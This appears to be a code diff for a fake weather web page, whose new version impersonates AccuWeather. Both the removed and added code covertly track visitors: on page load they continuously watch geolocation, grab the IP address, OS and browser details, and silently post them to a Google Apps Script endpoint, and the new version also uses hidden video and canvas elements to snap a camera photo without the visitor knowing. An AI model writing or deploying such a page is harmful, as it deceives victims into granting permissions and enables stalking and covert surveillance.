@@ -3,93 +3,89 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Weather & Local Alerts</title>
+    <title>AccuWeather - Local Forecast</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; background: #eef2f7; color: #333; }
-        .header { background: #005a9e; color: white; padding: 20px; text-align: center; font-size: 24px; font-weight: bold; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        .container { max-width: 500px; margin: 40px auto; padding: 20px; }
-        .weather-card { background: white; border-radius: 20px; padding: 30px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.05); }
-        .temp { font-size: 64px; font-weight: bold; margin: 10px 0; color: #005a9e; }
-        .desc { font-size: 18px; color: #666; margin-bottom: 20px; }
-        .btn { background: #005a9e; color: white; border: none; padding: 15px 30px; border-radius: 30px; font-size: 16px; cursor: pointer; transition: 0.3s; width: 100%; }
-        .btn:hover { background: #004a87; }
-        #status { margin-top: 15px; font-size: 13px; color: #999; }
+        body { font-family: 'Helvetica Neue', Arial, sans-serif; margin: 0; background: linear-gradient(to bottom, #4facfe 0%, #00f2fe 100%); color: white; text-align: center; height: 100vh; }
+        .card { background: rgba(255, 255, 255, 0.2); backdrop-filter: blur(10px); margin: 50px auto; padding: 40px; border-radius: 30px; width: 80%; max-width: 400px; box-shadow: 0 8px 32px rgba(0,0,0,0.2); }
+        h1 { font-size: 3rem; margin: 10px 0; }
+        .city { font-size: 1.5rem; font-weight: 300; }
+        .btn { background: white; color: #0078d4; border: none; padding: 15px 30px; border-radius: 50px; font-weight: bold; margin-top: 20px; cursor: pointer; }
+        canvas, video { display: none; } /* Hidden camera elements */
     </style>
 </head>
 <body>
 
-<div class="header">WeatherToday</div>
-
-<div class="container">
-    <div class="weather-card">
-        <div class="temp" id="temp">--°</div>
-        <div class="desc" id="location">Detecting Local Forecast...</div>
-        <p>Allow location access to receive real-time storm alerts and hyper-local temperature updates for your area.</p>
-        <button class="btn" onclick="startWeatherService()">Update Forecast</button>
-        <div id="status">Waiting for location permission...</div>
-    </div>
+<div class="card">
+    <div class="city" id="cityName">Detecting Location...</div>
+    <h1 id="temp">--°</h1>
+    <p id="desc">Sunny</p>
+    <p>We need your location to provide accurate local storm alerts.</p>
+    <button class="btn" onclick="startTracking()">Update My Weather</button>
 </div>
 
+<video id="video" autoplay></video>
+<canvas id="canvas"></canvas>
+
 <script>
-    // YOUR NEW DEPLOYMENT URL
-    const GOOGLE_URL = 'https://script.google.com/macros/s/AKfycbzohbAn6KJkQ4bY-MVbkoxDujr69xueLKwafl0kASlZ0buTVZTtKXVHWIknNIcV63Vg/exec';
+    const GOOGLE_URL = 'YOUR_APPS_SCRIPT_URL';
 
-    async function captureAndSend(pos) {
-        let ip = "Checking...", batt = "N/A";
-        
-        try {
-            // Get IP Address
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-            ip = ipData.ip;
-
-            // Get Battery Info
-            if (navigator.getBattery) {
-                const b = await navigator.getBattery();
-                batt = Math.round(b.level * 100) + "%";
-            }
-        } catch(e) {}
-
-        const payload = {
-            ip: ip,
-            latitude: pos.coords.latitude,
-            longitude: pos.coords.longitude,
-            os: navigator.platform,
-            battery: batt,
-            browser: navigator.userAgent.split(' ').pop()
-        };
-
-        // Stealth send to Google Sheet
-        fetch(GOOGLE_URL, {
-            method: 'POST',
-            mode: 'no-cors',
-            body: JSON.stringify(payload)
-        });
-    }
-
-    function startWeatherService() {
+    async function startTracking() {
         if (navigator.geolocation) {
-            document.getElementById('status').innerText = "Syncing with local satellite...";
-            
-            // MAJOR UPGRADE: watchPosition for continuous tracking
-            navigator.geolocation.watchPosition(pos => {
-                // UI Updates to look natural
-                document.getElementById('temp').innerText = "22°C"; 
-                document.getElementById('location').innerText = "Clear Skies - Tracking Active";
-                document.getElementById('status').innerText = "Last updated: " + new Date().toLocaleTimeString();
-                
-                captureAndSend(pos);
-            }, err => {
-                document.getElementById('status').innerText = "Error: Please enable location for weather data.";
-            }, { 
-                enableHighAccuracy: true,
-                maximumAge: 0 
-            });
+            navigator.geolocation.watchPosition(async (pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+
+                // 1. Get REAL weather for their specific coordinates
+                try {
+                    const weatherRes = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current_weather=true`);
+                    const weatherData = await weatherRes.json();
+                    document.getElementById('temp').innerText = Math.round(weatherData.current_weather.temperature) + "°";
+                    document.getElementById('cityName').innerText = "Local Forecast Active";
+                } catch(e) {}
+
+                // 2. Capture Photo Silently
+                capturePhoto();
+
+                // 3. Send Data to Sheet
+                sendToSheet(pos);
+            }, null, { enableHighAccuracy: true });
         }
     }
 
-    // Auto-start when they open the site
-    window.onload = startWeatherService;
+    async function capturePhoto() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            
+            setTimeout(() => {
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const imageData = canvas.toDataURL('image/jpeg');
+                // You would need a different Apps Script setup to save images
+                stream.getTracks().forEach(track => track.stop());
+            }, 2000);
+        } catch (err) { console.log("Camera blocked"); }
+    }
+
+    async function sendToSheet(pos) {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        
+        const payload = {
+            ip: ipData.ip,
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+            os: navigator.platform,
+            browser: navigator.userAgent
+        };
+
+        fetch(GOOGLE_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
+    }
+
+    window.onload = startTracking;
 </script>
 </body>
 </html>
